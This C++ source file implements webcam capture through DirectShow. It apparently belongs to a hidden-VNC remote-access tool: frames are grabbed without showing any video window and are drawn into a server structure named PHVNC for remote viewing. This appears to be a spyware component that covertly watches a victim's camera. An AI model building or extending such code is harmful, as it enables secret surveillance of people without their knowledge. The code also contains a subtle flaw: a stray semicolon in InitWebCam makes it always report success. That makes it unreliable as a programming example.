#include "includes.h"
#include "vnc\dib.h"
#include <streams.h>
#include <qedit.h>
#include "webcam.h"

void GetDefaultCapDevice(IBaseFilter **ppCap);
IPin *GetOutPin( IBaseFilter * pFilter, int nPin );
IPin *GetInPin( IBaseFilter * pFilter, int nPin );
ULONG CalcBitmapInfoSize(const BITMAPINFOHEADER &bmiHeader);

template <class T> void SafeRelease(T **ppT)
{
    if (*ppT)
    {
        (*ppT)->Release();
        *ppT = NULL;
    }
}

void SetFrameResolution(IPin *pPin,int dwWidth,int dwHeight)
{
	IAMStreamConfig *pCfg=NULL;
    pPin->QueryInterface(IID_IAMStreamConfig,(void **)&pCfg);
    if (pCfg)
    {
        int iCount=0,iSize=0;
        pCfg->GetNumberOfCapabilities(&iCount,&iSize);
        if (iSize == sizeof(VIDEO_STREAM_CONFIG_CAPS))
        {
            bool bFound=false;
            for (int iFormat=0; iFormat < iCount; iFormat++)
            {
                VIDEO_STREAM_CONFIG_CAPS scc;
                AM_MEDIA_TYPE *pmt;
                if (SUCCEEDED(pCfg->GetStreamCaps(iFormat, &pmt, (BYTE*)&scc)))
                {
                    if (pmt->formattype == FORMAT_VideoInfo)
                    {
                        if (pmt->cbFormat >= sizeof(VIDEOINFOHEADER))
                        {
                            VIDEOINFOHEADER *pVih=(VIDEOINFOHEADER*)(pmt->pbFormat);
                            BITMAPINFOHEADER *bmiHeader=&pVih->bmiHeader;
                            if ((bmiHeader->biWidth == dwWidth) && (bmiHeader->biHeight == dwHeight))
                            {
                                if (SUCCEEDED(pCfg->SetFormat(pmt)))
                                    bFound=true;
                            }
                            DeleteMediaType(pmt);
                            if (bFound)
                                break;
                        }
                    }
                }
            }
        }
        SafeRelease(&pCfg);
    }
    return;
}

void GetCamNameByIndex(DWORD dwIndex,IBaseFilter **ppCap)
{
    if (!ppCap)
        return;

    if (GetVIDDevCount() < dwIndex)
        dwIndex=0;

    *ppCap = NULL;

    ICreateDevEnum * pCreateDevEnum;
    CoCreateInstance(CLSID_SystemDeviceEnum, NULL,
                     CLSCTX_INPROC_SERVER,IID_PPV_ARGS(&pCreateDevEnum));

    if(!pCreateDevEnum)
        return;

    IEnumMoniker * pEm;
    pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);

    if(!pEm)
        return;
    pEm->Reset();

    DWORD i=0;
    while (true)
    {
        ULONG ulFetched = 0;
        IMoniker * pM;
        HRESULT hr = pEm->Next(1, &pM, &ulFetched);
        if(hr != S_OK)
            break;

        hr = pM->BindToObject(0,0,IID_IBaseFilter, (void **)ppCap);
        if(*ppCap)
        {
            if (i == dwIndex)
                break;
            i++;
            SafeRelease(ppCap);
        }
    }
    SafeRelease(&pEm);
    SafeRelease(&pCreateDevEnum);
    return;
}

void WINAPI CAMThread(PHVNC lpServer)
{
    CoInitialize(0);

    ISampleGrabber *pGrabber=NULL;
    CoCreateInstance(CLSID_SampleGrabber,NULL,CLSCTX_INPROC_SERVER,IID_PPV_ARGS(&pGrabber));
    if (pGrabber)
    {
        IBaseFilter *pGrabberBase=NULL;
        pGrabber->QueryInterface(IID_IBaseFilter,(void**)&pGrabberBase);
        if (pGrabberBase)
        {
            pGrabberBase->AddRef();
            IBaseFilter *pSource=NULL;
            GetCamNameByIndex(lpServer->WebCamInfo.dwDeviceIndex,&pSource);
            if (pSource)
            {
                IGraphBuilder *pGraph=NULL;
                CoCreateInstance(CLSID_FilterGraph,NULL,CLSCTX_INPROC_SERVER,IID_PPV_ARGS(&pGraph));
                if (pGraph)
                {
                    pGraph->AddFilter(pSource,L"Source");
                    pGraph->AddFilter(pGrabberBase,L"Grabber");
                    CMediaType GrabType;
                    GrabType.SetType(&MEDIATYPE_Video);
                    GrabType.SetSubtype(&MEDIASUBTYPE_RGB24);
                    pGrabber->SetMediaType(&GrabType);
                    IPin *pSourcePin=GetOutPin(pSource,0);
                    if (pSourcePin)
                    {
                        ///SetFrameResolution(pSourcePin,lpServer->DeskInfo.dwWidth,lpServer->DeskInfo.dwHeight);
                        IPin *pGrabPin=GetInPin(pGrabberBase,0);
                        if (pGrabPin)
                        {
                            if (SUCCEEDED(pGraph->Connect(pSourcePin,pGrabPin)))
                            {
                                AM_MEDIA_TYPE mt;
                                pGrabber->GetConnectedMediaType(&mt);
                                VIDEOINFOHEADER *vih=(VIDEOINFOHEADER*)mt.pbFormat;
                                BITMAPINFO bmi;
                                memcpy(&bmi,&vih->bmiHeader,sizeof(vih->bmiHeader));
                                FreeMediaType(mt);
                                SetScreenSize(lpServer,bmi.bmiHeader.biHeight,bmi.bmiHeader.biWidth,bmi.bmiHeader.biBitCount);

                                IPin *pGrabOutPin=GetOutPin(pGrabberBase,0);
                                if (pGrabOutPin)
                                {
                                    if (SUCCEEDED(pGraph->Render(pGrabOutPin)))
                                    {
                                        pGrabber->SetBufferSamples(TRUE);
                                        pGrabber->SetOneShot(TRUE);
                                        IVideoWindow *pWindow=NULL;
                                        pGraph->QueryInterface(IID_IVideoWindow,(void**)&pWindow);
                                        if (pWindow)
                                        {
                                            pWindow->put_AutoShow(OAFALSE);
                                            SafeRelease(&pWindow);
                                        }
                                        IMediaControl *pControl=NULL;
                                        pGraph->QueryInterface(IID_IMediaControl,(void**)&pControl);
                                        if (pControl)
                                        {
                                            SetEvent(lpServer->WebCamInfo.hEvent);
                                            MSG msg;
                                            while (GetMessage(&msg,0,0,0))
                                            {
                                                if (msg.message == WM_QUIT)
                                                {
                                                    SetEvent(lpServer->WebCamInfo.hEvent);
                                                    break;
                                                }
                                                else if (msg.message == WM_CAM_START)
                                                {
                                                    pControl->Run();
                                                    SetEvent(lpServer->WebCamInfo.hEvent);
                                                }
                                                else if (msg.message == WM_CAM_PAUSE)
                                                {
                                                    pControl->Stop();
                                                    SetEvent(lpServer->WebCamInfo.hEvent);
                                                }
                                                else if (msg.message == WM_CAM_NEXTFRAME)
                                                {
                                                    IMediaEvent *pEvent=NULL;
                                                    pGraph->QueryInterface(IID_IMediaEvent,(void**)&pEvent);
                                                    if (pEvent)
                                                    {
                                                        long dwEvCode=0;
                                                        pEvent->WaitForCompletion(INFINITE,&dwEvCode);
                                                        SafeRelease(&pEvent);

                                                        long cbBuffer;
                                                        pGrabber->GetCurrentBuffer(&cbBuffer,NULL);
                                                        BYTE *pBuffer=(BYTE*)CoTaskMemAlloc(cbBuffer);
                                                        pGrabber->GetCurrentBuffer(&cbBuffer,(long*)pBuffer);
                                                        SetDIBitsToDevice(lpServer->DIBInfo.hCompDC,0,0,lpServer->DeskInfo.dwWidth,lpServer->DeskInfo.dwHeight,0,0,0,lpServer->DeskInfo.dwHeight,pBuffer,&bmi,0);
                                                        CoTaskMemFree(pBuffer);
                                                        SetEvent(lpServer->WebCamInfo.hEvent);
                                                    }
                                                }
                                            }
                                            pControl->Stop();
                                            SafeRelease(&pControl);
                                        }
                                    }
                                    SafeRelease(&pGrabOutPin);
                                }
                            }
                            SafeRelease(&pGrabPin);
                        }
                        SafeRelease(&pSourcePin);
                    }
                    SafeRelease(&pGraph);
                }
                SafeRelease(&pSource);
            }
            SafeRelease(&pGrabberBase);
        }
        SafeRelease(&pGrabber);
    }
	CoUninitialize();
    return;
}

HRESULT GetPin(IBaseFilter *pFilter,PIN_DIRECTION dirrequired,int iNum,IPin **ppPin)
{
    IEnumPins *pEnum;
    *ppPin=NULL;

    HRESULT hr=pFilter->EnumPins(&pEnum);
    if (SUCCEEDED(hr))
    {
        ULONG ulFound;
        IPin *pPin;
        hr=E_FAIL;

        while (pEnum->Next(1,&pPin,&ulFound) == S_OK)
        {
            PIN_DIRECTION pindir=(PIN_DIRECTION)3;

            pPin->QueryDirection(&pindir);
            if (pindir == dirrequired)
            {
                if (!iNum)
                {
                    *ppPin=pPin;
                    hr=S_OK;
                    break;
                }
                iNum--;
            }
            pPin->Release();
        }
    }
    return hr;
}

IPin *GetInPin(IBaseFilter *pFilter,int nPin)
{
    IPin *pComPin=NULL;
    GetPin(pFilter,PINDIR_INPUT,nPin,&pComPin);
    return pComPin;
}

IPin *GetOutPin(IBaseFilter *pFilter,int nPin)
{
    IPin *pComPin=NULL;
    GetPin(pFilter,PINDIR_OUTPUT,nPin,&pComPin);
    return pComPin;
}

ULONG CalcBitmapInfoSize(const BITMAPINFOHEADER &bmiHeader)
{
    UINT bmiSize=(bmiHeader.biSize) ? bmiHeader.biSize : sizeof(BITMAPINFOHEADER);
    return bmiSize+bmiHeader.biClrUsed*sizeof(RGBQUAD);
}

BOOL InitWebCam(PHVNC lpServer)
{
    BOOL bRet=false;
    sscanf(lpServer->DeskInfo.szDeskName,"#webcam%d",&lpServer->WebCamInfo.dwDeviceIndex);
    lpServer->WebCamInfo.hEvent=CreateEvent(NULL,TRUE,FALSE,NULL);
    lpServer->WebCamInfo.hThread=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)CAMThread,lpServer,0,&lpServer->WebCamInfo.dwThreadId);
    if (WaitForSingleObject(lpServer->WebCamInfo.hEvent,10000) == WAIT_OBJECT_0);
        bRet=true;
    return bRet;
}

void CamSendMessage(PHVNC lpServer,DWORD dwMsg)
{
    if ((lpServer->WebCamInfo.dwThreadId))
    {
        DWORD dwExitCode;
        GetExitCodeThread(lpServer->WebCamInfo.hThread,&dwExitCode);
        if (dwExitCode == STILL_ACTIVE)
        {
            SetEvent(lpServer->WebCamInfo.hEvent);
            PostThreadMessage(lpServer->WebCamInfo.dwThreadId,dwMsg,0,0);
            WaitForSingleObject(lpServer->WebCamInfo.hEvent,INFINITE);
        }
    }
    return;
}

void CamCleanup(PHVNC lpServer)
{
    if ((lpServer->WebCamInfo.dwThreadId))
    {
        DWORD dwExitCode;
        GetExitCodeThread(lpServer->WebCamInfo.hThread,&dwExitCode);
        if (dwExitCode == STILL_ACTIVE)
        {
            SetEvent(lpServer->WebCamInfo.hEvent);
            PostThreadMessage(lpServer->WebCamInfo.dwThreadId,WM_QUIT,0,0);
            WaitForSingleObject(lpServer->WebCamInfo.hEvent,INFINITE);
            SysCloseHandle(lpServer->WebCamInfo.hEvent);
            lpServer->WebCamInfo.dwThreadId=0;
            SysCloseHandle(lpServer->WebCamInfo.hThread);
        }
    }
    return;
}

DWORD GetVIDDevCount()
{
    DWORD dwRet=0;
    CoInitialize(NULL);

    ICreateDevEnum *pDevEnum=NULL;
    CoCreateInstance(CLSID_SystemDeviceEnum,NULL,CLSCTX_INPROC_SERVER,IID_ICreateDevEnum,(void **)&pDevEnum);
    if (pDevEnum)
    {
        IEnumMoniker *pEnum;
        pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory,&pEnum,0);
        if (pEnum)
        {
            pEnum->Reset();
            IMoniker *pMoniker;
            while (pEnum->Next(1,&pMoniker,NULL) == S_OK)
            {
                dwRet++;
                SafeRelease(&pMoniker);
            }
            SafeRelease(&pEnum);
        }
        SafeRelease(&pDevEnum);
    }
    CoUninitialize();
    return dwRet;
}

